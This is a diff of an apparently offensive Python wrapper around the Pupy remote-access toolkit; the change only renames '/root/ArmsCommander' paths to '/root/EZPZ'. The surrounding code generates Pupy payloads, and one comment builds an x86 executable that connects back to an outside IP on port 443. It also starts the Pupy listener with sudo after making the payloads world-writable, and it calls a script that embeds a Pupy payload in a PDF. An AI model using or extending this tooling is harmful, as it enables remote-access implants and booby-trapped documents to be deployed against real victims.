@@ -50,7 +50,7 @@ transport_List = [
 
 def generate_pupy_payload():
     # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
-    os.system('python /root/ArmsCommander/remoteexploits/Pupy_Payload_Generator.py')
+    os.system('python /root/EZPZ/remoteexploits/Pupy_Payload_Generator.py')
     return
 
 def server_pupy():
@@ -74,10 +74,10 @@ def server_pupy():
         # os.chdir('/root/pupy/pupy')
         # the sudo su command was causing problems. Had to take it out
         # modify the autostart script for all users
-        os.system('sudo chmod 777 /root/ArmsCommander/payloads/*')
-        os.chdir('/root/ArmsCommander/payloads/')
+        os.system('sudo chmod 777 /root/EZPZ/payloads/*')
+        os.chdir('/root/EZPZ/payloads/')
         # execute the autostart script that was created during payload generation
-        os.system('sudo /root/ArmsCommander/payloads/pupy_server_startup.sh')
+        os.system('sudo /root/EZPZ/payloads/pupy_server_startup.sh')
     elif opt_Choice == "2":
         print ("\n\t".join(transport_List))
         server_pupy_transport = str(raw_input("Enter your TRANSPORT (Protocol): "))
@@ -101,11 +101,11 @@ def server_pupy():
 
 
 def embed_pdf():
-    os.system('python /root/ArmsCommander/remoteexploits/embed_pdf_pupy.py')
+    os.system('python /root/EZPZ/remoteexploits/embed_pdf_pupy.py')
     return
 
 def tester():
-    os.system('python /root/ArmsCommander/remoteexploits/testerPrototype2.py')
+    os.system('python /root/EZPZ/remoteexploits/testerPrototype2.py')
     return
 
 def main():
